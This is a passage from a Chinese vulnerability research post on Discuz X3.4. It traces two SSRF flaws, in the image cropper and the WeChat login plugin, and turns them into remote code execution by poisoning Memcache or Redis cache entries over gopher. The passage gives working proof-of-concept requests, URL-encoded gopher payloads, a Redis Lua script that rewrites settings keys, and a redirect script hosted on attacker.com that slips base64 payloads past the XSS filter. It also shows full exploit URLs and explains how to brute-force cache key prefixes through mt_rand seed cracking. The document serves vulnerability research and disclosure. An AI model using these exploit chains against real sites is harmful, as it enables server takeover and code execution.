  }&lt;/code&gt;&lt;p&gt;再找哪些地方调用了&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;方法，发现&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;Cropper&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;Watermark&lt;/code&gt;方法都调用了&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;。比如&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) {
        $return = $this-&amp;gt;init(&#39;thumb&#39;, $source, $target, $nosuffix);
        ......
    }&lt;/code&gt;&lt;p&gt;所以再找哪些地方调用了&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;方法，最终发现：&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/module/misc/misc_imgcropper.php&lt;/code&gt; 52-57行：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    require_once libfile(&#39;class/image&#39;);
    $image = new image();
    $prefix = $_GET[&#39;picflag&#39;] == 2 ? $_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;] : $_G[&#39;setting&#39;][&#39;attachurl&#39;];
    if(!$image-&amp;gt;Thumb($prefix.$_GET[&#39;cutimg&#39;], $cropfile, $picwidth, $picheight)) {
        showmessage(&#39;imagepreview_errorcode_&#39;.$image-&amp;gt;errorcode, null, null, array(&#39;showdialog&#39; =&amp;gt; true, &#39;closetime&#39; =&amp;gt; true));
    }&lt;/code&gt;&lt;p&gt;下断点调试发现 &lt;code class=&quot;inline&quot;&gt;$_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;]&lt;/code&gt; 的值为 &lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;，而 &lt;code class=&quot;inline&quot;&gt;$_G[&#39;setting&#39;][&#39;attachurl&#39;]&lt;/code&gt; 的值是 &lt;code class=&quot;inline&quot;&gt;data/attachment/&lt;/code&gt;。所以似乎 &lt;code class=&quot;inline&quot;&gt;$prefix&lt;/code&gt; 为 &lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt; 才有 SSRF 利用的可能。&lt;/p&gt;&lt;p&gt;一开始构造 &lt;code class=&quot;inline&quot;&gt;cutimg=/10.0.1.1/get&lt;/code&gt;，这样 &lt;code class=&quot;inline&quot;&gt;$url&lt;/code&gt; 的值就为 &lt;code class=&quot;inline&quot;&gt;//10.0.1.1/get&lt;/code&gt;，按道理来说这应该算是一个正常的 url，但是结果却请求失败了。&lt;/p&gt;&lt;p&gt;仔细跟进 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 发现，在 PHP 环境安装有 cURL 时，进入 curl 处理的代码分支，直到这里：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;curl_setopt($ch, CURLOPT_URL, $scheme.&#39;://&#39;.($ip ? $ip : $host).($port ? &#39;:&#39;.$port : &#39;&#39;).$path);&lt;/code&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$scheme&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$host&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$port&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$path&lt;/code&gt; 都是 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 解析 url 参数后的对应的值，而对像 &lt;code class=&quot;inline&quot;&gt;//10.0.1.1/get&lt;/code&gt; 这样的 url 解析时，&lt;code class=&quot;inline&quot;&gt;$scheme&lt;/code&gt; 的值是 &lt;code class=&quot;inline&quot;&gt;null&lt;/code&gt;，因此最后拼接的结果是 &lt;code class=&quot;inline&quot;&gt;://10.0.1.1/get&lt;/code&gt;，没有协议，curl 最后对这种url的请求会自动在前面加上 &lt;code class=&quot;inline&quot;&gt;HTTP://&lt;/code&gt;，结果就变成了请求 &lt;code class=&quot;inline&quot;&gt;HTTP://://10.0.1.1/get&lt;/code&gt;，这种 url 在我的环境中会导致 curl 报错。&lt;/p&gt;&lt;p&gt;所以我去掉了 curl 扩展，让 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码走 socket 发包的流程，踩了 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 和 Dz 代码的一些坑点（这里就不展开了，有兴趣的同学调下代码就知道了），最后发现像这样构造可以成功：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;cutimg=/:@localhost:9090/dz-imgcropper-ssrf&lt;/code&gt;&lt;p&gt;poc:&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;POST /misc.php?mod=imgcropper&amp;amp;picflag=2&amp;amp;cutimg=/:@localhost:9090/dz-imgcropper-ssrf HTTP/1.1
Host: ubuntu-trusty.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: xkmD_2132_sid=E5sbVr; xkmD_2132_saltkey=m6Y8022s; xkmD_2132_lastvisit=1521612483; xkmD_2132_lastact=1521624907%09misc.php%09imgcropper; xkmD_2132_home_readfeed=1521616105; xkmD_2132_seccode=1.ecda87c571707d3f92; xkmD_2132_ulastactivity=a0f4A9CWpermv2t0GGOrf8%2BzCf6dZyAoQ3Sto7ORINqJeK4g3xcX; xkmD_2132_auth=40a4BIESn2PZVmGftNQ2%2BD1ImxpYr0HXke37YiChA2ruG6OryhLe0bUg53XKlioysCePIZGEO1jmlB1L4qbo; XG8F_2132_sid=fKyQMr; XG8F_2132_saltkey=U7lxxLwx; XG8F_2132_lastvisit=1521683793; XG8F_2132_lastact=1521699709%09index.php%09; XG8F_2132_ulastactivity=200fir8BflS1t8ODAa3R7YNsZTQ1k262ysLbc9wdHRzbPnMZ%2BOv7; XG8F_2132_auth=3711UP00sKWDx2Vo1DtO17C%2FvDfrelGOrwhtDmwu5vBjiXSHuPaFVJ%2FC%2BQi1mw4v4pJ66jx6otRFKfU03cBy; XG8F_2132_lip=172.16.99.1%2C1521688203; XG8F_2132_nofavfid=1; XG8F_2132_onlineusernum=3; XG8F_2132_sendmail=1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

imgcroppersubmit=1&amp;amp;formhash=f8472648&lt;/code&gt;&lt;p&gt;此时 url 即为&lt;code class=&quot;inline&quot;&gt;//:@localhost:9090/dz-imgcropper-ssrf&lt;/code&gt;。SSRF 请求成功：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-93df11df6c4d4c62d3ece504ab6df48c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1340&quot; data-rawheight=&quot;426&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-93df11df6c4d4c62d3ece504ab6df48c&quot; data-watermark-src=&quot;v2-815e3237c0b985a0c6d5fe8cd432c8a5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;通过这种方式进行构造利用的话，不太需要额外的限制条件（只要求服务端 PHP 环境没有安装 curl 扩展）￼，但是只能发 HTTP GET 请求，并且服务端不跟随跳转。漏洞危害有限。&lt;/p&gt;&lt;p&gt;后来 l3m0n 师傅也独立发现了这个漏洞，并且他发现较高版本的 curl 是可以成功请求 &lt;code class=&quot;inline&quot;&gt;HTTP://:/&lt;/code&gt; 的，较高版本的 curl 会将这种 url 地址解析到 127.0.0.1 的 80 端口：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d0adaa84880f61a188de94eec474cea9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;834&quot; data-rawheight=&quot;476&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d0adaa84880f61a188de94eec474cea9&quot; data-watermark-src=&quot;v2-26ed5e568292db52b5ff9839b3efac5f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;最后他再利用之前 PHP &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 的解析 bug（ &lt;a href=&quot;https://bugs.php.net/bug.php?id=73192&quot;&gt;https://bugs.php.net/bug.php?id=73192&lt;/a&gt; ），及利用 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 和 curl 对 url 的解析差异，成功进行 302 跳转到任意恶意地址，最后再 302 跳转到 gopher 就做到发送任意数据包。详情可以参考 l3m0n 的博客：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/iamstudy/articles/discuz_x34_ssrf_1.html&quot;&gt;Discuz x3.4前台SSRF - l3m0n - 博客园&lt;/a&gt;&lt;/p&gt;&lt;p&gt;但是这种利用方式对 PHP、curl 版本都有特殊的要求，而且要服务端环境接受空 Host 的请求。总的来说，imgcropper SSRF 仍然比较鸡肋。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Weixin Plugin SSRF&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/plugin/wechat/wechat.class.php&lt;/code&gt; &lt;code class=&quot;inline&quot;&gt;WeChat&lt;/code&gt;类&lt;code class=&quot;inline&quot;&gt;syncAvatar&lt;/code&gt;方法：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    static public function syncAvatar($uid, $avatar) {

        if(!$uid || !$avatar) {
            return false;
        }

        if(!$content = dfsockopen($avatar)) {
            return false;
        }

        $tmpFile = DISCUZ_ROOT.&#39;./data/avatar/&#39;.TIMESTAMP.random(6);
        file_put_contents($tmpFile, $content);

        if(!is_file($tmpFile)) {
            return false;
        }

        $result = uploadUcAvatar::upload($uid, $tmpFile);
        unlink($tmpFile);

        C::t(&#39;common_member&#39;)-&amp;gt;update($uid, array(&#39;avatarstatus&#39;=&amp;gt;&#39;1&#39;));

        return $result;
    }&lt;/code&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/plugin/wechat/wechat.inc.php&lt;/code&gt; 中调用了&lt;code class=&quot;inline&quot;&gt;WeChat::syncAvatar&lt;/code&gt;，直接用&lt;code class=&quot;inline&quot;&gt;$_GET[&#39;avatar&#39;]&lt;/code&gt;作为参数传进去：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;......

elseif(($ac == &#39;register&#39; &amp;amp;&amp;amp; submitcheck(&#39;submit&#39;) || $ac == &#39;wxregister&#39;) &amp;amp;&amp;amp; $_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_allowregister&#39;]) {

        ......

        $uid = WeChat::register($_GET[&#39;username&#39;], $ac == &#39;wxregister&#39;);

        if($uid &amp;amp;&amp;amp; $_GET[&#39;avatar&#39;]) {
            WeChat::syncAvatar($uid, $_GET[&#39;avatar&#39;]);
        }

}&lt;/code&gt;&lt;p&gt;不过因为这里用到了微信登录的插件，所以要利用的话需要目标站开启微信登录：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-92f7c79bdd080b925a61f3d9dfdc303b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1664&quot; data-rawheight=&quot;626&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-92f7c79bdd080b925a61f3d9dfdc303b&quot; data-watermark-src=&quot;v2-6f876f9bceda4185e091e5e9e575051d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里 SSRF 的构造很简单，直接在&lt;code class=&quot;inline&quot;&gt;avatar&lt;/code&gt;参数构造 url 即可（只是注意&lt;code class=&quot;inline&quot;&gt;wxopenid&lt;/code&gt;参数每次请求都要足够随机保证没有重复，如果重复的话代码是无法走到发起请求的逻辑的）：&lt;/p&gt;&lt;p&gt;poc:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http://localhost:9090/dz-weixin-plugin-ssrf&amp;amp;wxopenid=dont_be_evil&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-191979a78babc6dbbaba9dd357fb1b32_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1332&quot; data-rawheight=&quot;382&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-191979a78babc6dbbaba9dd357fb1b32&quot; data-watermark-src=&quot;v2-418abb5681a74804c21c23aea28940b1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Dz SSRF getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;乌云关闭前 Jannock 给 Dz 交过需要一定条件命令执行的漏洞，当时由于漏洞还未公开乌云就已关闭所以具体的细节我已不得而知。不过我后来从网上各处搜罗查找资料，发现 chengable 写的一篇分析那个漏洞文章：&lt;a href=&quot;http://chengable.net/index.php/archives/46/&quot;&gt;discuz利用ssrf+缓存应用getshell漏洞分析 - CHENGABLE BLOG&lt;/a&gt; ，从而知道是用 SSRF 篡改缓存从而 getshell。本着学习的态度，我搭环境调试了这个精彩的漏洞利用方式，并且发现除了 Redis，攻击 Memcache 也是可以的，只不过要多踩一个坑。&lt;/p&gt;&lt;p&gt;先说结论：Dz 由 &lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 函数导致的 SSRF，如果要 getshell，目标站需要满足以下几个条件：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;服务端 PHP 环境安装有 curl 扩展（为了通过 curl 使用 gopher 协议）&lt;/li&gt;&lt;li&gt;使用 Memcache 或未设置密码认证的 Redis 进行缓存&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;由于 imgcropper SSRF 利用限制较多，所以这里我用 Weixin Plugin SSRF进行演示。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSRF 攻击 Memcache&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Dz 整合 Memcache 配置成功后，默认情况下网站首页右下角会出现&lt;code class=&quot;inline&quot;&gt;MemCache On&lt;/code&gt;的标志：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9a09681c05a0d2850344cbf3afe7ce76_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;814&quot; data-rawheight=&quot;98&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF 要攻击 Memcache ，第一个问题是，如何找到正确的键名？&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;install/index.php&lt;/code&gt; 345-357行：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;        $uid = DZUCFULL ? 1 : $adminuser[&#39;uid&#39;];
        $authkey = md5($_SERVER[&#39;SERVER_ADDR&#39;].$_SERVER[&#39;HTTP_USER_AGENT&#39;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);
        $_config[&#39;db&#39;][1][&#39;dbhost&#39;] = $dbhost;
        $_config[&#39;db&#39;][1][&#39;dbname&#39;] = $dbname;
        $_config[&#39;db&#39;][1][&#39;dbpw&#39;] = $dbpw;
        $_config[&#39;db&#39;][1][&#39;dbuser&#39;] = $dbuser;
        $_config[&#39;db&#39;][1][&#39;tablepre&#39;] = $tablepre;
        $_config[&#39;admincp&#39;][&#39;founder&#39;] = (string)$uid;
        $_config[&#39;security&#39;][&#39;authkey&#39;] = $authkey;
        $_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;
        $_config[&#39;memory&#39;][&#39;prefix&#39;] = random(6).&#39;_&#39;;

        save_config_file(ROOT_PATH.CONFIG, $_config, $default_config);&lt;/code&gt;&lt;p&gt;这是 Dz 在安装的时候的一段代码，这段代码设置了 authkey、Cookie 前缀以及缓存键名前缀，其中用到了&lt;code class=&quot;inline&quot;&gt;random&lt;/code&gt;函数生成随机字符串。所以跟进这个&lt;code class=&quot;inline&quot;&gt;random&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function random($length) {
    $hash = &#39;&#39;;
    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;
    $max = strlen($chars) - 1;
    PHP_VERSION &amp;lt; &#39;4.2.0&#39; &amp;amp;&amp;amp; mt_srand((double)microtime() * 1000000);
    for($i = 0; $i &amp;lt; $length; $i++) {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}&lt;/code&gt;&lt;p&gt;可以发现，如果 PHP 版本大于 4.2.0，那么 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 随机数的种子是不变的。也就是说，生成 authkey、Cookie 前缀以及缓存键名前缀时调用的 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 用的都是同一个种子，而 Cookie 前缀是已知的，通过观察 HTTP 请求就可以知道。因此，随机数播种的种子可以被缩到一个极小的范围内进行猜解。这里可以用 &lt;a href=&quot;http://www.openwall.com/php_mt_seed/README&quot;&gt;php_mt_seed&lt;/a&gt; 进行种子爆破。&lt;/p&gt;&lt;p&gt;通过 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 种子的猜解，缓存键名前缀的可能性从 62^6 缩小到不到 1000 个，这就完全属于可以爆破的范畴了。对猜解出来的所有可能的缓存键名前缀分别构造 SSRF 请求发送到服务器，最后即能更改某一键名对应的键值。&lt;/p&gt;&lt;p&gt;Memcache 缓存键名的问题解决了，接下来的问题是，缓存数据被加载到哪了？如何通过修改缓存数据来 getshell？&lt;/p&gt;&lt;p&gt;这一部分的思路就可以直接参照 chengable 写的那篇文章了，&lt;code class=&quot;inline&quot;&gt;output_replace&lt;/code&gt; 函数细节有略微变化，但大体思路是一致的，所以我也不再赘述了。&lt;/p&gt;&lt;p&gt;最后准备用 gopher 协议构造 SSRF 的 payload。写这样一段代码（先假设缓存键名前缀是 &lt;code class=&quot;inline&quot;&gt;IwRW7l&lt;/code&gt;）:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php

$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;search&#39;][&#39;plugins&#39;] = &#39;/.*/&#39;;
$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;replace&#39;][&#39;plugins&#39;] = &#39;phpinfo()&#39;;
$_G[&#39;setting&#39;][&#39;rewritestatus&#39;] = 1;

$memcache = new Memcache;
$memcache-&amp;gt;connect(&#39;localhost&#39;, 11211) or die (&quot;Could not connect&quot;);
$memcache-&amp;gt;set(&#39;IwRW7l_setting&#39;, $_G[&#39;setting&#39;]);&lt;/code&gt;&lt;p&gt;运行这段 PHP 代码，同时抓包，然后将数据包改成 gopher 的形式，即：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gopher://localhost:11211/_set%20IwRW7l_setting%201%200%20161%0d%0aa%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&lt;/code&gt;&lt;p&gt;但是直接用它去 SSRF 是不可以的，会被&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;检测到特殊字符而被拒绝请求：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-89e49e7e6e1b503f37268926e59fa072_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2094&quot; data-rawheight=&quot;966&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-89e49e7e6e1b503f37268926e59fa072&quot; data-watermark-src=&quot;v2-73b6cedf186352e00466852500931c0c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以利用这里请求跟随跳转的特点，在自己的远程服务器上放类似于这样的一个脚本：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php

$url = base64_decode($_REQUEST[&#39;url&#39;]);
header( &quot;Location: &quot; . $url );&lt;/code&gt;&lt;p&gt;这样就可以将 SSRF URL 进行 base64 编码从而规避&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;的检测。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjExMjExL19zZXQlMjBJd1JXN2xfc2V0dGluZyUyMDElMjAwJTIwMTYxJTBkJTBhYSUzQTIlM0ElN0JzJTNBNiUzQSUyMm91dHB1dCUyMiUzQmElM0ExJTNBJTdCcyUzQTQlM0ElMjJwcmVnJTIyJTNCYSUzQTIlM0ElN0JzJTNBNiUzQSUyMnNlYXJjaCUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTQlM0ElMjIlMkYuKiUyRiUyMiUzQiU3RHMlM0E3JTNBJTIycmVwbGFjZSUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTklM0ElMjJwaHBpbmZvKCklMjIlM0IlN0QlN0QlN0RzJTNBMTMlM0ElMjJyZXdyaXRlc3RhdHVzJTIyJTNCaSUzQTElM0IlN0Q%253D&amp;amp;wxopenid=xxxyyy&lt;/code&gt;&lt;p&gt;再访问&lt;code class=&quot;inline&quot;&gt;/forum.php?mod=ajax&amp;amp;action=getthreadtypes&amp;amp;inajax=yes&lt;/code&gt;，即可看到&lt;code class=&quot;inline&quot;&gt;phpinfo()&lt;/code&gt;代码已被执行：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ca0244ee736f19d51caedfdf36004da7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2582&quot; data-rawheight=&quot;1462&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-ca0244ee736f19d51caedfdf36004da7&quot; data-watermark-src=&quot;v2-61894903db5590c7c8c1251e4b498219&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;由于缓存被暴力篡改，会导致网站无法正常运行。恢复正常办法是刷新缓存。用上面的思路直接一次 getshell 后执行以下命令，网站就可以恢复正常：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;echo -e &#39;flush_all&#39; | nc localhost 11211&lt;/code&gt;&lt;p&gt;最后我写了个将上述整个过程自动化 getshell 的脚本：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3952b1f9cbacc62cbc64ca197b23983c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1200&quot; data-rawheight=&quot;514&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3952b1f9cbacc62cbc64ca197b23983c&quot; data-watermark-src=&quot;v2-5dc509a6ec888cb6faecc0f2d1987412&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3ff111646ab29d28ca0e83dfa1359515_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;580&quot; data-rawheight=&quot;380&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3ff111646ab29d28ca0e83dfa1359515&quot; data-watermark-src=&quot;v2-405577e479bdba8da2c9dce19e91feff&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSRF 攻击 Redis&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类似地，Dz 整合 Redis 配置成功后，默认情况下网站首页右下角会出现&lt;code class=&quot;inline&quot;&gt;Redis On&lt;/code&gt;的标志：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-38b8351402d3faa4c921b20723838c3d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;796&quot; data-rawheight=&quot;114&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua 脚本，可以直接用 lua 脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis 没有配置密码认证，Discuz requirepass 那一项为空：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-33cd4ccebce220760348de8419512b17_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;724&quot; data-rawheight=&quot;220&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-33cd4ccebce220760348de8419512b17&quot; data-watermark-src=&quot;v2-dc5956c6a43821a0a6383d62f810ef58&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Redis 交互命令行执行 lua 脚本：&lt;/p&gt;&lt;code lang=&quot;lua&quot;&gt;eval &quot;local t=redis.call(&#39;keys&#39;,&#39;*_setting&#39;); for i,v in ipairs(t) do redis.call(&#39;set&#39;, v, &#39;a:2:{s:6:\&quot;output\&quot;;a:1:{s:4:\&quot;preg\&quot;;a:2:{s:6:\&quot;search\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:4:\&quot;/.*/\&quot;;}s:7:\&quot;replace\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:9:\&quot;phpinfo()\&quot;;}}}s:13:\&quot;rewritestatus\&quot;;i:1;}&#39;) end; return 1;&quot; 0&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d7dcf11173196ded7d866083ebf8019c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1434&quot; data-rawheight=&quot;180&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;同样地，对这个过程抓包，将数据包改成 gopher 的形式：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gopher://localhost:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24264%0d%0alocal%20t%3Dredis.call(&#39;keys&#39;%2C&#39;*_setting&#39;)%3B%20for%20i%2Cv%20in%20ipairs(t)%20do%20redis.call(&#39;set&#39;%2C%20v%2C%20&#39;a%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&#39;)%20end%3B%20return%201%3B%0d%0a%241%0d%0a0%0d%0a&lt;/code&gt;&lt;p&gt;SSRF 利用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjYzNzkvXyozJTBkJTBhJTI0NCUwZCUwYWV2YWwlMGQlMGElMjQyNjQlMGQlMGFsb2NhbCUyMHQlM0RyZWRpcy5jYWxsKCdrZXlzJyUyQycqX3NldHRpbmcnKSUzQiUyMGZvciUyMGklMkN2JTIwaW4lMjBpcGFpcnModCklMjBkbyUyMHJlZGlzLmNhbGwoJ3NldCclMkMlMjB2JTJDJTIwJ2ElM0EyJTNBJTdCcyUzQTYlM0ElMjJvdXRwdXQlMjIlM0JhJTNBMSUzQSU3QnMlM0E0JTNBJTIycHJlZyUyMiUzQmElM0EyJTNBJTdCcyUzQTYlM0ElMjJzZWFyY2glMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E0JTNBJTIyJTJGLiolMkYlMjIlM0IlN0RzJTNBNyUzQSUyMnJlcGxhY2UlMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E5JTNBJTIycGhwaW5mbygpJTIyJTNCJTdEJTdEJTdEcyUzQTEzJTNBJTIycmV3cml0ZXN0YXR1cyUyMiUzQmklM0ExJTNCJTdEJyklMjBlbmQlM0IlMjByZXR1cm4lMjAxJTNCJTBkJTBhJTI0MSUwZCUwYTAlMGQlMGE%253D&amp;amp;wxopenid=xx